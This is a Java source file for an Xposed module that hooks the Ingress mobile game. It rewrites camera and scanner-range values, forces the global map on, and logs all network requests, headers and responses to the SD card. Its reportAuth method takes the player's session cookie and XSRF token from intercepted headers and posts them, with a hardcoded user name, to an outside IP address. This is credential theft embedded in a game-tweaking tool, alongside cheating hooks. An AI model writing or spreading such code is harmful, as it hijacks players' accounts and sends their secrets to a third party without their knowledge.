package com.example.xposedtesting;

import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XSharedPreferences;
import de.robv.android.xposed.callbacks.XC_LoadPackage;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONException;

import java.io.*;
import java.net.URI;
import java.util.*;
import java.util.zip.GZIPInputStream;

import static de.robv.android.xposed.XposedHelpers.*;

public class Ingress extends DefaultAbstractApp {

    static String cachedCookie, cachedToken;

    public String getName() {
        return "Ingress";
    }

    public void prepare(final XC_LoadPackage.LoadPackageParam lpparam) {
        log("Preparing Ingress: hookBadlogicCameraView");
        hookBadlogicCameraView(lpparam);
        log("Preparing Ingress: hookIngressNet");
        hookIngressNet(lpparam);
        log("Preparing Ingress: hookIngressScanner");
        hookIngressScanner(lpparam);
        log("Prepare Ingress success!");
    }

    private void hookBadlogicCameraView(final XC_LoadPackage.LoadPackageParam lpparam) {
        final XSharedPreferences pref = new XSharedPreferences("com.example.xposedtesting", "user_settings");
        final Boolean debug = pref.getBoolean("debug", false);

        final Class<?> perspectiveCamera = findClass("com.badlogic.gdx.graphics.PerspectiveCamera", lpparam.classLoader);
        //final Class<?> vector3 = findClass("com.badlogic.gdx.math.Vector3", lpparam.classLoader);
        try {
            findAndHookMethod(perspectiveCamera, "update", boolean.class, new XC_MethodHook() {
                @Override
                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                    if (debug) {
                        pref.reload();
                    }

                    //get all real game params
                    Float near, far, fieldOfView;
                    Float directionX, directionY, directionZ, oldDirectionX, oldDirectionY, oldDirectionZ;
                    Float positionX, positionY, positionZ, oldPositionX, oldPositionY, oldPositionZ;
                    Float upX, upY, upZ, oldUpX, oldUpY, oldUpZ;
                    Float coeffX, coeffZ, coeffPref;
                    Object direction, position, up;

                    near = getFloatField(param.thisObject, "near");
                    far = getFloatField(param.thisObject, "far");
                    fieldOfView = getFloatField(param.thisObject, "fieldOfView");

                    direction = getObjectField(param.thisObject, "direction");
                    position = getObjectField(param.thisObject, "position");
                    up = getObjectField(param.thisObject, "up");

                    oldDirectionX = getFloatField(direction, "x");
                    oldDirectionY = getFloatField(direction, "y");
                    oldDirectionZ = getFloatField(direction, "z");
                    oldPositionX = getFloatField(position, "x");
                    oldPositionY = getFloatField(position, "y");
                    oldPositionZ = getFloatField(position, "z");
                    oldUpX = getFloatField(up, "x");
                    oldUpY = getFloatField(up, "y");
                    oldUpZ = getFloatField(up, "z");

                    if (debug) {
                        log("PerspectiveCamera: props: near: " + near.toString() + ", far: " + far.toString() + ", fov: " + fieldOfView.toString());
                        log("PerspectiveCamera: dir: x: " + oldDirectionX.toString() + ", y: " + oldDirectionY.toString() + ", z: " + oldDirectionZ.toString());
                        log("PerspectiveCamera: pos: x: " + oldPositionX.toString() + ", y: " + oldPositionY.toString() + ", z: " + oldPositionZ.toString());
                        log("PerspectiveCamera: up : x: " + oldUpX.toString() + ", y: " + oldUpY.toString() + ", z: " + oldUpZ.toString());
                    }

                    //prepare to change params
                    //skip all non-default scanner views
                    if (near != 15f || far != 2048f || fieldOfView != 40f) {
                        return;
                    }
                    //skip deploy and recharge views, adjust cursor position on fire mode
                    //NORMAL: up 0.75953907, dir -0.6504616
                    //FIRE: up 0.6228586, dir -0.7823344
                    //DEPLOY: up 0.65962243, dir -0.75159717
                    //RECHARGE: up 0.72784215, dir -0.6857447
                    Integer roundedUpY = Math.round(oldUpY * 1000f);
                    Integer roundedDirectionY = Math.round(oldDirectionY * 1000f);
                    if (roundedUpY == 760 && roundedDirectionY == -650) {
                        coeffPref = pref.getFloat("coeffDefault", 0.6f);
                    } else if (roundedUpY == 623 && roundedDirectionY == -782) {
                        coeffPref = pref.getFloat("coeffFire", 0f);
                    } else if (roundedUpY == 660 && roundedDirectionY == -752) {
                        coeffPref = pref.getFloat("coeffDeploy", -0.42f);

                        //do nothing on deploy mode
                        return;
                    } else if (roundedUpY == 728 && roundedDirectionY == -686) {
                        coeffPref = pref.getFloat("coeffRecharge", 0.27f);

                        //and on recharge mode
                        return;
                    } else {
                        coeffPref = pref.getFloat("coeffDefault", 1f);
                    }


                    //set map scale
                    if (pref.getBoolean("scaleEnabled", false)) {
                        //link mode
                        if (oldDirectionX == 0f && oldDirectionY == -1f && oldDirectionZ == 0f) {
                            setFloatField(param.thisObject, "near", pref.getFloat("near4link", 15f));
                            setFloatField(param.thisObject, "far", pref.getFloat("far4link", 2048f));
                            setFloatField(param.thisObject, "fieldOfView", pref.getFloat("fov4link", 40f));

                            //dont mess other params
                            return;
                        } else {
                            setFloatField(param.thisObject, "near", pref.getFloat("near", 15f));
                            setFloatField(param.thisObject, "far", pref.getFloat("far", 2048f));
                            setFloatField(param.thisObject, "fieldOfView", pref.getFloat("fov", 40f));
                        }

                        if (debug) {
                            near = getFloatField(param.thisObject, "near");
                            far = getFloatField(param.thisObject, "far");
                            fieldOfView = getFloatField(param.thisObject, "fieldOfView");
                            log("PerspectiveCamera: SET props: near: " + near.toString() + ", far: " + far.toString() + ", fov: " + fieldOfView.toString());
                        }
                    }

                    if (pref.getBoolean("posByUpEnabled", false)) {
                        coeffX = Math.abs(oldPositionX / oldUpX);
                        coeffZ = Math.abs(oldPositionZ / oldUpZ);

                        positionX = oldUpX * coeffX * coeffPref;
                        positionZ = oldUpZ * coeffZ * coeffPref;
                        if (debug) {
                            log("PerspectiveCamera: SET pos by up(" + oldUpX.toString() + "," + oldUpZ.toString() + "): x"
                                    + positionX.toString() + "(" + oldPositionX.toString() + "), z"
                                    + positionZ.toString() + "(" + oldPositionZ.toString() + "), "
                                    + "coeff" + "(" + coeffX.toString() + "," + coeffZ.toString() + ")");
                        }
                        setFloatField(position, "x", positionX);
                        setFloatField(position, "z", positionZ);
                    } else {
                        if (pref.getBoolean("upEnabled", false)) {
                            setFloatField(up, "x", pref.getFloat("upX", 0f));
                            setFloatField(up, "y", pref.getFloat("upY", 0f));
                            setFloatField(up, "z", pref.getFloat("upZ", 0f));
                            if (debug) {
                                upX = getFloatField(up, "x");
                                upY = getFloatField(up, "y");
                                upZ = getFloatField(up, "z");
                                log("PerspectiveCamera: SET up : x: " + upX.toString() + ", y: " + upY.toString() + ", z: " + upZ.toString());
                            }
                        }
                        if (pref.getBoolean("posEnabled", false)) {
                            setFloatField(position, "x", pref.getFloat("posX", 0f));
                            //camera height: can be changed by app
                            //setFloatField(position, "y", pref.getFloat("posY", 0f));
                            setFloatField(position, "z", pref.getFloat("posZ", 0f));
                            if (debug) {
                                upX = getFloatField(position, "x");
                                upY = getFloatField(position, "y");
                                upZ = getFloatField(position, "z");
                                log("PerspectiveCamera: SET pos: x: " + upX.toString() + ", y: " + upY.toString() + ", z: " + upZ.toString());
                            }
                        }
                    }

                    //that is fucking map tilt!! DISABLE FOREVER!!
                    //should be set after posByUp, cuz directionY is used there
                    if (pref.getBoolean("dirEnabled", false)) {
                        setFloatField(direction, "x", pref.getFloat("dirX", 0f));
                        setFloatField(direction, "y", pref.getFloat("dirY", 0f));
                        setFloatField(direction, "z", pref.getFloat("dirZ", 0f));
                        if (debug) {
                            directionX = getFloatField(direction, "x");
                            directionY = getFloatField(direction, "y");
                            directionZ = getFloatField(direction, "z");
                            log("PerspectiveCamera: SET dir: x: " + directionX.toString() + ", y: " + directionY.toString() + ", z: " + directionZ.toString());
                        }
                    }
                }
            });

        } catch (Throwable e) {
            log("EXCEPTION in PerspectiveCamera: " + e.getMessage() + ", " + e.getClass().toString());
        }
    }

    private void hookIngressNet(final XC_LoadPackage.LoadPackageParam lpparam) {

        final Class<?> s = findClass("o.s", lpparam.classLoader);
        final Class<?> asj = findClass("o.asj", lpparam.classLoader);
        try {
            //public static InputStream \u02ca(final URI uri, final asj asj, final String s)
            findAndHookMethod(s, "ˊ", URI.class, asj, String.class, new XC_MethodHook() {
                @Override
                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                    URI uri = (URI) param.args[0];
                    String body = (String) param.args[2];
                    log("s: req.uri: " + uri.toString());
                    try {
                        PrintWriter file = new PrintWriter(new BufferedWriter(new FileWriter("/sdcard/ingress/request-data.dat", true)));
                        file.println(uri.toString());
                        file.println(body);
                        file.println();
                        file.close();
                    } catch (IOException e) {
                        log("Failed writing to file: " + e.getMessage());
                    }
                }
            });
        } catch (Throwable e) {
            log("EXCEPTION in IngressNet: " + e.getMessage() + ", " + e.getClass().toString());
        }
        try {
            //public static void \u02ca(final HashMap<String, String> hashMap, final asj asj, final boolean b)
            findAndHookMethod(s, "ˊ", HashMap.class, asj, boolean.class, new XC_MethodHook() {
                @Override
                protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                    String cookie = "";
                    String token = "";
                    HashMap<String, String> hm = (HashMap) param.args[0];
                    log("s: req.headers");
                    try {
                        PrintWriter file = new PrintWriter(new BufferedWriter(new FileWriter("/sdcard/ingress/request-headers.dat", true)));
                        for (HashMap.Entry entry : hm.entrySet()) {
                            file.println(entry.getKey() + ": " + entry.getValue());
                            if ("Cookie".equals(entry.getKey())) {
                                cookie = entry.getValue().toString();
                            } else if ("X-XsrfToken".equals(entry.getKey())) {
                                token = entry.getValue().toString();
                            }
                        }
                        file.println();
                        file.close();
                        if (!cookie.isEmpty() && !token.isEmpty()) {
                            reportAuth(cookie, token);
                        }
                    } catch (IOException e) {
                        log("Failed writing to file: " + e.getMessage());
                    }
                }
            });
        } catch (Throwable e) {
            log("EXCEPTION in IngressNet: " + e.getMessage() + ", " + e.getClass().toString());
        }
        final Class<?> aln = findClass("o.aln", lpparam.classLoader);
        try {
            //public static InputStream \u02ca(final aln aln, final URI uri, final int n, final Map<String, List<String>> map, final InputStream inputStream, final String s)
            findAndHookMethod(s, "ˊ", aln, URI.class, int.class, Map.class, InputStream.class, String.class, new XC_MethodHook() {
                @Override
                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                }

                @Override
                protected void afterHookedMethod(MethodHookParam param) throws IOException {
                    URI uri = (URI) param.args[1];
                    Integer httpCode = (Integer) param.args[2];
                    Map<String, List<String>> map = (Map) param.args[3];
                    String type = (String) param.args[5];
                    ByteArrayOutputStream inputData = new ByteArrayOutputStream();
                    if (param.getResult().getClass() == GZIPInputStream.class) {
                        InputStream origIs = (InputStream) param.getResult();
                        byte[] buffer = new byte[1024];
                        int length;
                        while ((length = origIs.read(buffer)) != -1) {
                            inputData.write(buffer, 0, length);
                        }
                        BufferedInputStream fakeIs = new BufferedInputStream(new ByteArrayInputStream(inputData.toByteArray()));
                        param.setResult(fakeIs);
                    } else {
                        log("s: input stream: NOT GZIP! " + param.getResult().getClass().toString());
                    }
                    log("s: resp.uri: " + uri.toString() + ", resp.code: " + httpCode.toString() + ", type: " + type + ", size: " + inputData.size());

                    try {
                        PrintWriter file = new PrintWriter(new BufferedWriter(new FileWriter("/sdcard/ingress/response.dat", true)));
                        file.println(uri.toString());
                        for (Map.Entry<String, List<String>> entry : map.entrySet()) {
                            for (String oneString : entry.getValue()) {
                                if (entry.getKey() == null) {
                                    file.println(oneString);
                                } else {
                                    file.println(entry.getKey() + ": " + oneString);
                                }
                            }
                        }
                        file.println();
                        file.println(inputData.toString());
                        file.println();
                        file.println();
                        file.close();
                    } catch (IOException e) {
                        log("Failed writing to file: " + e.getMessage());
                    }
                }
            });
        } catch (Throwable e) {
            log("EXCEPTION in IngressNet: " + e.getMessage() + ", " + e.getClass().toString());
        }

        final Class<?> ufecb = findClass("o.ﻋ", lpparam.classLoader);
        try {
            findAndHookMethod(ufecb, "ˊ", InputStream.class, OutputStream.class, new XC_MethodHook() {
                @Override
                protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                    Long ret = (Long) param.getResult();
                    log("ufecb: readed: " + ret.toString());
                }
            });
        } catch (Throwable e) {
            log("EXCEPTION in IngressNet: " + e.getMessage() + ", " + e.getClass().toString());
        }
    }

    private void hookIngressScanner(final XC_LoadPackage.LoadPackageParam lpparam)
    {
        final XSharedPreferences pref = new XSharedPreferences("com.example.xposedtesting", "user_settings");
        final Boolean debug = pref.getBoolean("debug", false);

        final Class<?> p = findClass("o.p", lpparam.classLoader);
        final Class<?> scannerKnobs = findClass("com.nianticproject.ingress.knobs.ScannerKnobs", lpparam.classLoader);
        final Class<?> clientFeatureKnobBundle = findClass("com.nianticproject.ingress.knobs.ClientFeatureKnobBundle", lpparam.classLoader);
        try {
            findAndHookMethod(p, "ᐝ", new XC_MethodHook() {
                @Override
                protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                    if (debug) {
                        pref.reload();
                    }
                    Object scannerKnobs = param.getResult();
                    setIntField(scannerKnobs, "rangeM", pref.getInt("scannerRangeM", 300));
                    param.setResult(scannerKnobs);
                }
            });
        } catch (Throwable e) {
            log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
        }
        try {
            findAndHookMethod(p, "ʻ", new XC_MethodHook() {
                @Override
                protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                    if (debug) {
                        pref.reload();
                    }
                    Object clientFeatureKnobBundle = param.getResult();
                    setBooleanField(clientFeatureKnobBundle, "showGlobalMap", pref.getBoolean("showGlobalMap", true));
                    param.setResult(clientFeatureKnobBundle);
                }
            });
        } catch (Throwable e) {
            log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
        }

        final Class<?> ze = findClass("o.ze", lpparam.classLoader);
        final Class<?> zeif = findClass("o.ze$if", lpparam.classLoader);
        final Class<?> u1d2d = findClass("o.ᴭ", lpparam.classLoader);
        final Class<?> Color = findClass("com.badlogic.gdx.graphics.Color", lpparam.classLoader);
        try {
            //public if(final \u1d2d \u02ca, final Color \u02ce, final int \u02cf, final float \u141d, final float \u02bb, final float \u02bc, final float \u02bd)
            findAndHookConstructor(zeif, ze, u1d2d, Color, int.class, float.class, float.class, float.class, float.class, new XC_MethodHook() {
                @Override
                protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                    if (debug) {
                        pref.reload();
                    }
                    Object color = param.args[2];
                    float r,g,b,a;
                    r = getFloatField(color, "r");
                    g = getFloatField(color, "g");
                    b = getFloatField(color, "b");
                    a = getFloatField(color, "a");
                    if (debug) {
                        log("color: r:" + r + ", g: " + g + ", b: " + b + ", a: " + a);
                    }

                    if (pref.getBoolean("colorEnabled", false)) {
                        setFloatField(color, "r", pref.getFloat("colorR", 1.0f));
                        setFloatField(color, "g", pref.getFloat("colorG", 1.0f));
                        setFloatField(color, "b", pref.getFloat("colorB", 1.0f));
                        setFloatField(color, "a", pref.getFloat("colorA", 1.0f));
                    }
                }
            });
        } catch (Throwable e) {
            log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
        }

        final Class<?> portalInfoHudIf = findClass("com.nianticproject.ingress.common.ui.hud.PortalInfoHud$if", lpparam.classLoader);
        try {
            findAndHookMethod(portalInfoHudIf, "ˊ", String.class, new XC_MethodHook() {
                @Override
                protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                    String fullString = (String) param.args[0];
                    log("portalInfoHud: string: " + fullString);
                    param.setResult(fullString);
                }
            });
        } catch (Throwable e) {
            log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
        }

        //disable disabling immersive move when opening COMM
        final Class<?> ave = findClass("o.ave", lpparam.classLoader);
        try {
            findAndHookMethod(ave, "ʼ", new XC_MethodHook() {
                @Override
                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                    param.setResult(null);
                }
            });
        } catch (Throwable e) {
            log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
        }
    }

    private void reportAuth(String cookie, String token) throws UnsupportedEncodingException, JSONException {
        if (cachedCookie != null && cachedToken != null) {
            if (cachedCookie.equals(cookie) && cachedToken.equals(token)) {
                log("auth: already sent");

                return;
            }
        }
        HttpClient client = new DefaultHttpClient();
        HttpPost fakeRequest = new HttpPost("http://52.32.233.72/i/ing-auth.php");
        List<NameValuePair> urlParameters = new ArrayList<NameValuePair>();
        urlParameters.add(new BasicNameValuePair("user", "appleblo0m"));
        urlParameters.add(new BasicNameValuePair("cookie", cookie));
        urlParameters.add(new BasicNameValuePair("token", token));

        fakeRequest.setEntity(new UrlEncodedFormEntity(urlParameters));
        log("auth: reporting...");
        try {
            HttpResponse fakeResponse = client.execute(fakeRequest);
            fakeResponse.getEntity().getContent().close();
        } catch (Throwable e) {
            log("auth: report ERROR: " + e.getClass().toString() + ", " + e.getMessage());

            return;
        }
        cachedCookie = cookie;
        cachedToken = token;
    }
}
